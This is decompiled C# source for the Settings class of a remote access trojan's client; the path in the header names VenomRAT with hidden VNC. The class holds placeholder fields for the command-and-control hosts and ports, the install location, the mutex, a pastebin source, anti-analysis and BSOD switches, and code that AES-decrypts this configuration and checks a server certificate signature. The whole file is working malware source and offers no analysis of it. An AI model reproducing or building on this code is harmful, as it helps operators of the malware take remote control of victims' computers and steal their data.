// Decompiled with JetBrains decompiler
// Type: Client.Settings
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using Client.Algorithm;
using Client.Helper;
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client
{
  public static class Settings
  {
    public static string porTs = "%Ports%";
    public static string hosTs = "%Hosts%";
    public static string verSion = "%Version%";
    public static string inStall = "%Install%";
    public static readonly string InstallFolder = "%Folder%";
    public static readonly string InstallFile = "%File%";
    public static string Key = "%Key%";
    public static string mtx = "%MTX%";
    public static readonly string CertifiCate = "%Certificate%";
    public static string serverSignaTure = "%Serversignature%";
    public static X509Certificate2 serverCertificate;
    public static Aes256 aes256;
    public static string pasteBin = "%Paste_bin%";
    public static string bsOd = "%BSOD%";
    public static string hwId = "";
    public static string deLay = "%Delay%";
    public static string Group = "%Group%";
    public static string antiProcess = "%AntiProcess%";
    public static string anTi = "%Anti%";

    public static bool InitializeSettings()
    {
      try
      {
        Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
        aes256 = new Aes256(Key);
        porTs = aes256.Decrypt(porTs);
        hosTs = aes256.Decrypt(hosTs);
        verSion = aes256.Decrypt(verSion);
        inStall = aes256.Decrypt(inStall);
        mtx = aes256.Decrypt(mtx);
        pasteBin = aes256.Decrypt(pasteBin);
        anTi = aes256.Decrypt(anTi);
        antiProcess = aes256.Decrypt(antiProcess);
        bsOd = aes256.Decrypt(bsOd);
        Group = aes256.Decrypt(Group);
        hwId = HwidGen.HWID();
        serverSignaTure = aes256.Decrypt(serverSignaTure);
        serverCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(CertifiCate)));
        return VerifyHash();
      }
      catch
      {
        return false;
      }
    }

    private static bool VerifyHash()
    {
      try
      {
        using (SHA256Managed shA256Managed = new SHA256Managed())
          return ((RSACryptoServiceProvider) serverCertificate.PublicKey.Key).VerifyHash(shA256Managed.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(serverSignaTure));
      }
      catch (Exception)
      {
        return false;
      }
    }
  }
}
